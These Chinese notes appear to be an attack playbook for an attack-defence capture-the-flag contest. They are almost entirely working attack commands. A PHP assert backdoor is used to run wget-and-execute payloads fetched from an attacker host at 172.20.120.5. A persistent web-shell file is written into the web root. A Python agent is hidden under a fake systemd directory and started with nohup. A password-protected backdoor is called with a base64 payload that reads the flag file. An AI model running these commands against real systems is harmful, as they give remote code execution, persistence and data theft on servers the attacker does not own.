
系统原始的后门assert($_POST[welcome])参数，首次执行
welcome=system("wget -q http://172.20.120.5/php.txt -O /tmp/cache.php;php /tmp/cache.php|cat /flag;");      提前修改本机监听的ip、flag路径及web目录路径


wget -q http://172.20.120.5/php.txt -O /tmp/cache.php;php /tmp/cache.php;
wget -q http://172.20.120.5/py.txt -O /tmp/mylab.py;nohup python /tmp/mylab.py >/dev/null;

welcome=system("wget -q http://172.20.120.5/php.txt -O /tmp/cache.php;php /tmp/cache.php|cat /flag;wget -q http://172.20.120.5/user-inc.txt -O /var/www/html/test/--user.inc.php;");  

myserver存放的文件（80端口根目录）：
php.txt  /tmp/cache.php   需要修改攻击者IP和web路径及flag路径
user-inc.txt  /var/www/html/--user-inc.php
py.txt  /tmp/systemd-private-a29c8d4b5e76422cb78179dd14906715-systemd-timesyncd.service-p9PBKc/session/mylab.py  #需要修改攻击者ip、flag路径
get.php?flag=$ip:$flag  #修改存放本地接收flag文件的路径



手动利用自己写入的后门
http://$victimip/--user-inc.php
POST参数:p=cswD$ha&sec=cHJpbnQoZmlsZV9nZXRfY29udGVudHMoIi9mbGFnIikpOw%3D%3D   
#base64('print(file_get_contents("/flag"));')


md5('cswD$ha')=='9bdae23f2f19c4c3d25e7719f7a72ee9'
